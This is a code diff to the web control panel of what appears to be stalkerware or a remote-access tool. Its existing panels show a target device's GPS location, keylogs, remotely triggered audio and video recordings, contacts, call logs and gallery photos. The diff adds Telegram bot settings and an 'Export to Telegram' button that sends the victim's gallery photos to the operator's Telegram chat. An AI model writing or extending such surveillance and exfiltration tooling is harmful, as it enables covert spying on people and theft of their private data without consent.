@@ -416,7 +416,8 @@ body {
     font-weight: 600;
 }
 
-.gallery-controls select {
+.gallery-controls select,
+.gallery-controls input {
     background: #0d0a0b;
     color: #fff;
     border: 1px solid #3b292d;
@@ -430,7 +431,9 @@ body {
 }
 
 .gallery-controls select:hover,
-.gallery-controls select:focus {
+.gallery-controls select:focus,
+.gallery-controls input:hover,
+.gallery-controls input:focus {
     border-color: #ff3439;
     box-shadow: 0 0 8px rgba(255, 50, 55, 0.2);
 }
@@ -619,6 +622,17 @@ body {
     cursor: pointer;
 }
 
+/* Settings */
+.settings-input {
+    width: 100%;
+    padding: 12px;
+    background: #1a1214;
+    border: 1px solid #2d1d20;
+    color: #fff;
+    border-radius: 8px;
+    margin-bottom: 15px;
+}
+
 /* Responsive */
 @media(max-width: 900px) {
     .gps-stats { grid-template-columns: repeat(2, 1fr); }
@@ -681,6 +695,7 @@ body {
         <button class="control-btn" onclick="showAudio(this)">🎤 Audio Recorder</button>
         <button class="control-btn" onclick="showVideo(this)">🎥 Video Recorder</button>
         <button class="control-btn" onclick="showContacts(this)">📞 Contacts</button>
+        <button class="control-btn" onclick="showSettings(this)">⚙️ Settings</button>
     </div>
 
     <!-- GPS Tracker Panel -->
@@ -734,6 +749,7 @@ body {
                 </select>
                 <button class="refresh-btn" onclick="fetchGalleryPhotos(false)">⟳ Fetch Gallery Photos</button>
                 <button class="force-btn" onclick="fetchGalleryPhotos(true)">☁ Fetch All Gallery Photos</button>
+                <button class="force-btn" style="background:#ff9500;" onclick="exportGalleryToTelegram()">📤 Export to Telegram</button>
             </div>
 
             <div class="gallery-section-title">⚡ Latest Synced Photos <span class="badge" id="latestCountBadge">0</span></div>
@@ -836,6 +852,20 @@ body {
             <hr style="border-color:#333; margin:20px 0;">
             <h3>👤 Contacts</h3>
             <div id="contactsList"></div>
+        </div>
+    </section>
+
+    <!-- Settings Panel -->
+    <section class="panel" id="settingsPanel" style="display:none;">
+        <div class="panel-header">
+            <div class="panel-title">⚙️ Telegram Bot Settings</div>
+        </div>
+        <div style="padding:20px;">
+            <label>Bot Token</label>
+            <input type="text" id="tgBotToken" class="settings-input" placeholder="Enter your Telegram bot token">
+            <label>Chat ID</label>
+            <input type="text" id="tgChatId" class="settings-input" placeholder="Enter your Telegram chat ID">
+            <button class="force-btn" onclick="saveTelegramSettings()">💾 Save Settings</button>
         </div>
     </section>
 
@@ -1105,6 +1135,7 @@ function showKeylog(btn) { setActiveTab(btn); document.querySelectorAll('.panel'
 function showAudio(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("audioPanel").style.display = "block"; loadAudioList(); }
 function showVideo(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("videoPanel").style.display = "block"; loadVideoList(); }
 function showContacts(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("contactsPanel").style.display = "block"; loadContacts(); }
+function showSettings(btn) { setActiveTab(btn); document.querySelectorAll('.panel').forEach(p => p.style.display = 'none'); document.getElementById("settingsPanel").style.display = "block"; loadTelegramSettings(); }
 
 // ================== FORCE GPS UPDATE ==================
 async function forceGpsUpdate() {
@@ -1146,7 +1177,6 @@ async function refreshKeylog() {
             container.innerHTML = "No keylogs yet.";
             return;
         }
-        // নতুন ডেটা উপরে
         logs.reverse();
         container.innerHTML = logs.map(log => `
             <div class="keylog-entry">
@@ -1176,8 +1206,7 @@ async function sendAudioRequest() {
         });
         const data = await res.json();
         if (!res.ok) throw new Error(data.error || 'Failed');
-        document.getElementById("audioStatus").innerHTML = 
-            `Recording requested for ${duration} seconds. Check list below.`;
+        document.getElementById("audioStatus").innerHTML = `Recording requested for ${duration} seconds. Check list below.`;
         loadAudioList();
     } catch (e) {
         document.getElementById("audioStatus").innerHTML = `Error: ${e.message}`;
@@ -1293,6 +1322,43 @@ async function loadContacts() {
     } catch (e) {
         document.getElementById("callLogsList").innerHTML = "Error loading call logs.";
         document.getElementById("contactsList").innerHTML = "Error loading contacts.";
+    }
+}
+
+// ================== TELEGRAM SETTINGS ==================
+async function loadTelegramSettings() {
+    const res = await fetch('/api/telegram/settings');
+    const data = await res.json();
+    document.getElementById("tgBotToken").value = data.botToken || '';
+    document.getElementById("tgChatId").value = data.chatId || '';
+}
+
+async function saveTelegramSettings() {
+    const botToken = document.getElementById("tgBotToken").value.trim();
+    const chatId = document.getElementById("tgChatId").value.trim();
+    if (!botToken || !chatId) return alert('Bot token and chat ID required.');
+    const res = await fetch('/api/telegram/settings', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ botToken, chatId })
+    });
+    if (res.ok) alert('Settings saved.');
+    else alert('Failed to save settings.');
+}
+
+async function exportGalleryToTelegram() {
+    const deviceId = getDeviceId();
+    try {
+        const res = await fetch('/api/gallery/export', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId })
+        });
+        const data = await res.json();
+        if (!res.ok) throw new Error(data.error || 'Export failed');
+        alert(data.message || 'Export started.');
+    } catch (e) {
+        alert('Export error: ' + e.message);
     }
 }
 
